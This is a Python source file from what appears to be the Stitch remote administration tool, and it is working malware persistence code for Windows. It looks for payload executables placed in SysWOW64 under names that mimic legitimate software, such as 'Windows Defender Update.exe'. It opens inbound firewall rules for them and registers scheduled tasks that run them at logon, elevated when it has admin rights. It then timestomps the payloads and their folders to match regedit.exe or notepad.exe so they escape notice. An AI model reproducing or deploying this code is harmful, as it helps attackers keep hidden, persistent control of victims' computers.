#!/usr/bin/python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import subprocess, sys, os, ctypes

def run_command(command):
    try:
        subp = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        subp_output, errors = subp.communicate()
        if not errors:
            if subp_output == '':
                return '[+] Command successfully executed.\n'
            else:
                return subp_output
        return "[!] {}".format(errors)
    except KeyboardInterrupt:
        print "Terminated command."

nsis_exe = {'chrome':'Google Installer.exe',
        'drive' : 'Windows Drive Installer.exe',
        'IAStorIcon' : 'Windows Iastor Installer.exe',
        'SecEdit' : 'Windows SecEdit Update.exe',
        'searchfilterhost' : 'Windows SearchConfig Installer.exe',
        'WUDFPort' : 'Windows Ports Manager Installer.exe',
        'MSASTUIL' : 'Windows Defender Update.exe',
        'WmiPrvSE' : 'Windows WmiPrv Installer.exe'}

nsis_path = {'chrome':'Google',
        'drive' : 'WDRV',
        'IAStorIcon' : 'WIAS',
        'SecEdit' : 'WSEC',
        'searchfilterhost' : 'WSRCH',
        'WUDFPort' : 'WUDF',
        'MSASTUIL' : 'WSEC',
        'WmiPrvSE' : 'WMIP'}

for key in nsis_path:
    inst_dir = "C:\\Windows\\SysWOW64\\"
    pld_exe = '{}.exe'.format(key)
    pld_nsis = nsis_path[key]
    pld_path = os.path.join(inst_dir,pld_nsis)
    pld_exe_path = os.path.join(pld_path,pld_exe)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    if os.path.exists(pld_exe_path):
        run_command('netsh advfirewall firewall add rule name="{}" dir=in action=allow program="{}" enable=yes'.format(key,pld_exe_path))
        if is_admin:
            run_command('schtasks /create /sc onlogon /tn {}_st /rl highest /tr "{}"'.format(key,pld_exe_path))
        else:
            run_command('schtasks /create /sc onlogon /tn {}_st /tr "{}"'.format(key,pld_exe_path))

    if os.path.exists('C:\\Windows\\regedit.exe'):
        infofile = 'C:\\Windows\\regedit.exe'
    elif os.path.exists('C:\\Windows\\notepad.exe'):
        infofile = 'C:\\Windows\\notepad.exe'

    cmd ='powershell "echo (Get-ChildItem %s).LastWriteTime"' % (infofile)
    l_mod = run_command(cmd).strip()
    cmd ='powershell "echo (Get-ChildItem %s).LastAccessTime"' % (infofile)
    l_acc = run_command(cmd).strip()
    cmd ='powershell "echo (Get-ChildItem %s).CreationTime"' % (infofile)
    l_cre = run_command(cmd).strip()

    cmd ='powershell "Get-ChildItem \'%s\' | %% { $_.LastWriteTime = \'%s\' }"' % (pld_exe_path,l_mod)
    run_command(cmd)
    cmd ='powershell "Get-ChildItem \'%s\' | %% { $_.LastAccessTime = \'%s\' }"' % (pld_exe_path,l_acc)
    run_command(cmd)
    cmd ='powershell "Get-ChildItem \'%s\' | %% { $_.CreationTime = \'%s\' }"' % (pld_exe_path,l_cre)
    run_command(cmd)

    cmd ='powershell "Get-Item \'%s\' | %% { $_.LastWriteTime = \'%s\' }"' % (pld_path,l_mod)
    run_command(cmd)
    cmd ='powershell "Get-Item \'%s\' | %% { $_.LastAccessTime = \'%s\' }"' % (pld_path,l_acc)
    run_command(cmd)
    cmd ='powershell "Get-Item \'%s\' | %% { $_.CreationTime = \'%s\' }"' % (pld_path,l_cre)
    run_command(cmd)
